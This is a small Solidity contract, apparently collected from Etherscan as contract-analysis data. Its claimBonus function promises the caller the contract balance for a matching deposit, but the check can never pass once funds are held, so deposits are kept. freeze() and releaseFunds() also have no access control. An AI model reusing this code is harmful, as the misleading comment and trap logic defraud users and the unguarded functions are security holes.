/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.4;

contract FirstContract {

  bool frozen = false;
  address owner;

  function FirstContract() payable {
    owner = msg.sender;
  }

  function freeze() {
    frozen = true;
  }

  //Release balance back to original owner if any
  function releaseFunds() {
    owner.transfer(this.balance);
  }

  //You can claim current balance if you put the same amount (or more) back in
  function claimBonus() payable {
    if ((msg.value >= this.balance) && (frozen == false)) {
      msg.sender.transfer(this.balance);
    }
  }

}